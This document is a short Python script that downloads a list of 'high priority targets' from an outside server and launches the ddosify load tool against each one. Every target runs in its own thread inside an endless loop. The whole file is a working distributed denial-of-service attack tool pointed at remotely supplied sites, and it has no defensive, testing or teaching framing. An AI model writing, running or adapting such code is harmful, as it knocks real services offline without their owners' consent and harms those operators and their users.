from subprocess import run
from threading import Thread
import re
import requests

def run_ddosify(target):
    if not re.match('^https?://', target):
        target = 'https://' + target
    while True:
        run([
            'ddosify',
            '-t',
            target
        ])

if __name__ == '__main__':
    response = requests.get("http://ddos.ralfeus.eu/high_priority_targets.txt")
    for target in response.iter_lines():
        target = target.decode()
        print(f"Running ddosify on '{target}'")
        Thread(name=target, target=run_ddosify, args=[target]).start()